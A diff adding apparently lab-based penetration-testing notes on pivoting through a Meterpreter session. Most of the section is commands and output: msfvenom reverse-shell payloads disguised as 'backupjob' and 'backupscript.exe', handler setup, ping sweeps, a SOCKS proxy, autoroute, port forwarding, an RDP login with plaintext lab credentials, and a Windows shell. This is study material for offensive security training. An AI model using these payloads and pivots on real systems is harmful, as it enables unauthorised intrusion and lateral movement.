@@ -998,3 +998,359 @@ flowchart LR
 </details>
 
 </details>
+
+---
+
+<details>
+<summary><h1>🕳️ Meterpreter Tunneling & Port Forwarding</h1></summary>
+
+In some scenarios, we may already have Meterpreter shell access on the Ubuntu server (the pivot host) and want to perform enumeration scans through it while still benefiting from the conveniences that Meterpreter sessions provide. In these cases, we can create a pivot directly through the Meterpreter session without relying on SSH port forwarding.
+
+<details>
+<summary><h2>1. Configuring & Starting the multi/handler</h2></summary>
+
+We can generate a Meterpreter shell for the Ubuntu server, which will give us a shell on our attack host listening on port 8080.
+
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
+```
+```bash
+# [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+# [-] No arch selected, selecting arch: x64 from the payload
+# No encoder specified, outputting raw payload
+# Payload size: 130 bytes
+# Final size of elf file: 250 bytes
+# Saved as: backupjob
+```
+
+Before copying the payload over, we can start a multi/handler, also known as a Generic Payload Handler.
+
+```bash
+msf6 > use exploit/multi/handler
+# [*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
+# lhost => 0.0.0.0
+msf6 exploit(multi/handler) > set lport 8080
+# lport => 8080
+msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+# payload => linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > run
+# [*] Started reverse TCP handler on 0.0.0.0:8080 
+```
+
+We can copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session.
+
+```bash
+ubuntu@WebServer:~$ ls
+#backupjob
+ubuntu@WebServer:~$ chmod +x backupjob 
+ubuntu@WebServer:~$ ./backupjob
+```
+
+We need to make sure the Meterpreter session is successfully established upon executing the payload.
+
+```bash
+# [*] Sending stage (3020772 bytes) to 10.129.202.64
+# [*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2025-11-20 12:27:43 -0500
+meterpreter > pwd
+# /home/ubuntu
+```
+
+</details>
+
+<details>
+<summary><h2>2. Ping Sweep</h2></summary>
+
+We know the Windows target resides in the **172.16.5.0/23** network. If its firewall allows ICMP, our first step is to perform a **ping sweep** through the pivot host. Since we have Meterpreter access on the Ubuntu pivot host, we can generate ICMP traffic from it directly.
+
+**Ping Sweep using Meterpreter**
+```bash
+meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+```
+```bash
+[*] Performing ping sweep for IP range 172.16.5.0/23
+```
+
+**Ping Sweep For Loop on Linux Pivot Hosts**
+```bash
+for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+```
+
+**Ping Sweep For Loop Using CMD**
+```bash
+for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+```
+
+**Ping Sweep Using PowerShell**
+```bash
+1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
+```
+
+> **NOTE:** It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build its arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.
+
+If a host’s firewall blocks **ICMP**, a ping sweep will not provide useful results. In such cases, we can switch to a **TCP-based scan** of the **172.16.5.0/23** network using Nmap. This allows us to identify live hosts and open ports without relying on ICMP responses.
+
+</details>
+
+<details>
+<summary><h2>3. Configuring MSF's SOCKS Proxy</h2></summary>
+
+Instead of using SSH port forwarding, we can pivot through the Meterpreter session by configuring a **SOCKS proxy** with Metasploit’s `socks_proxy` post-exploitation routing module.
+
+* The proxy is configured using **SOCKS version 4a**.  
+* A listener is started on **port 9050**.  
+* All traffic sent through this proxy will be **routed via the active Meterpreter session**, allowing Nmap and other tools to scan the target network transparently through the pivot.
+
+This setup enables full TCP enumeration of the remote network even when ICMP is unavailable.
+
+**Configuring MSF's SOCKS Proxy**
+```bash
+msf6 > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
+# SRVPORT => 9050
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
+# SRVHOST => 0.0.0.0
+msf6 auxiliary(server/socks_proxy) > set version 4a
+# version => 4a
+msf6 auxiliary(server/socks_proxy) > run
+# [*] Auxiliary module running as background job 0.
+
+# [*] Starting the SOCKS proxy server
+msf6 auxiliary(server/socks_proxy) > options
+
+# Module options (auxiliary/server/socks_proxy):
+
+#    Name     Current Setting  Required  Description
+#    ----     ---------------  --------  -----------
+#    SRVHOST  0.0.0.0          yes       The address to listen on
+#    SRVPORT  9050             yes       The port to listen on
+#    VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
+#                                         5)
+
+# Auxiliary action:
+
+#    Name   Description
+#    ----   -----------
+#    Proxy  Run a SOCKS proxy server
+
+msf6 auxiliary(server/socks_proxy) > jobs
+
+# Jobs
+# ====
+
+#   Id  Name                           Payload  Payload opts
+#   --  ----                           -------  ------------
+#   0   Auxiliary: server/socks_proxy
+```
+
+**Adding a Line to proxychains.conf if Needed**
+
+Once the SOCKS server is running, we can route traffic from tools like **Nmap** through our pivot on the compromised Ubuntu host using **proxychains**. To enable this, we add the following entry to the end of the `/etc/proxychains.conf` file (if it is not already present):
+```bash
+grep -qxF "socks4 127.0.0.1 9050" /etc/proxychains.conf || echo "socks4 127.0.0.1 9050" | sudo tee -a /etc/proxychains.conf
+```
+
+> **NOTE:** Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.
+
+</details>
+
+<details>
+<summary><h2>4. Creating Routes with AutoRoute</h2></summary>
+
+Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.
+
+```bash
+msf6 > use post/multi/manage/autoroute
+msf6 post(multi/manage/autoroute) > set SESSION 1
+# SESSION => 1
+msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
+# SUBNET => 172.16.5.0
+msf6 post(multi/manage/autoroute) > run
+# [!] SESSION may not be compatible with this module:
+# [!]  * incompatible session platform: linux
+# [*] Running module against 10.129.202.64
+# [*] Searching for subnets to autoroute.
+# [+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
+# [+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
+# [*] Post module execution completed
+```
+
+It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
+
+```bash
+meterpreter > run autoroute -s 172.16.5.0/23
+
+# [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+# [!] Example: run post/multi/manage/autoroute OPTION=value [...]
+# [*] Adding a route to 172.16.5.0/255.255.254.0...
+# [+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
+# [*] Use the -p option to list all active routes
+```
+
+After adding the necessary route(s) we can use the -p option to list the active routes to make sure our configuration is applied as expected.
+
+**Listing Active Routes with AutoRoute**
+
+```bash
+meterpreter > run autoroute -p
+
+# [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+# [!] Example: run post/multi/manage/autoroute OPTION=value [...]
+
+# Active Routing Table
+# ====================
+
+#    Subnet             Netmask            Gateway
+#    ------             -------            -------
+#    10.129.0.0         255.255.0.0        Session 1
+#    172.16.4.0         255.255.254.0      Session 1
+#    172.16.5.0         255.255.254.0      Session 1
+```
+
+The route has been added to the 172.16.5.0/23 network. We will now be able to use proxychains to route our Nmap traffic via our Meterpreter session.
+
+**Testing Proxy & Routing Functionality**
+
+```bash
+proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
+```
+```bash
+# ProxyChains-3.1 (http://proxychains.sf.net)
+# Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+# Starting Nmap 7.92 ( https://nmap.org ) at 2025-11-20 13:40 EST
+# Initiating Parallel DNS resolution of 1 host. at 13:40
+# Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
+# Initiating Connect Scan at 13:40
+# Scanning 172.16.5.19 [1 port]
+# |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
+# Discovered open port 3389/tcp on 172.16.5.19
+# Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)
+# Nmap scan report for 172.16.5.19 
+# Host is up (0.12s latency).
+
+# PORT     STATE SERVICE
+# 3389/tcp open  ms-wbt-server
+
+# Read data files from: /usr/bin/../share/nmap
+# Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
+```
+
+</details>
+
+<details>
+<summary><h2>5. Port Forwarding</h2></summary>
+
+Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
+
+**Portfwd options**
+```bash
+meterpreter > help portfwd
+
+# Usage: portfwd [-h] [add | delete | list | flush] [args]
+
+# OPTIONS:
+
+#     -h        Help banner.
+#     -i <opt>  Index of the port forward entry to interact with (see the "list" command).
+#     -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
+#     -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
+#     -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
+#     -r <opt>  Forward: remote host to connect to.
+#     -R        Indicates a reverse port forward.
+```
+
+**Creating Local TCP Relay**
+```bash
+meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
+
+# [*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
+```
+
+The above command requests the Meterpreter session to start a listener on our attack host's locmeal port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.
+
+**Connecting to Windows Target through localhost**
+```bash
+xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+```
+
+**Netstat Output**
+
+We can use Netstat to view information about the session we recently established. From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised. This allows us to view any sessions a host has established.
+
+```bash
+netstat -antp
+```
+```bash
+tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp 
+```
+
+</details>
+
+<details>
+<summary><h2>6. Meterpreter Reverse Port Forwarding</h2></summary>
+
+Metasploit can also perform **reverse port forwarding**, allowing us to listen on a specific port of the compromised server and forward incoming connections back to our attack host. In this scenario, we want the Ubuntu pivot host to forward all requests received on port **1234** to a listener running on our attack machine on port **8081**.
+
+**Reverse Port Forwarding Rules**
+
+```bash
+meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+# [*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
+```
+
+**Reverse Port Forwarding Rules**
+
+```bash
+meterpreter > bg
+
+# [*] Backgrounding session 1...
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+# payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LPORT 8081 
+# LPORT => 8081
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
+# LHOST => 0.0.0.0
+msf6 exploit(multi/handler) > run
+
+# [*] Started reverse TCP handler on 0.0.0.0:8081 
+```
+
+We can now create a reverse shell payload that will send a connection back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to attack host's ip:8081 that we configured.
+
+**Generating the Windows Payload**
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
+```
+```bash
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: backupscript.exe
+```
+
+Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.
+
+**Establishing the Meterpreter session**
+
+```bash
+# [*] Started reverse TCP handler on 0.0.0.0:8081 
+# [*] Sending stage (200262 bytes) to 10.10.14.18
+# [*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500
+
+meterpreter > shell
+# Process 2336 created.
+# Channel 1 created.
+# Microsoft Windows [Version 10.0.17763.1637]
+# (c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\>
+```
+
+</details>
+
+</details>
+
+---
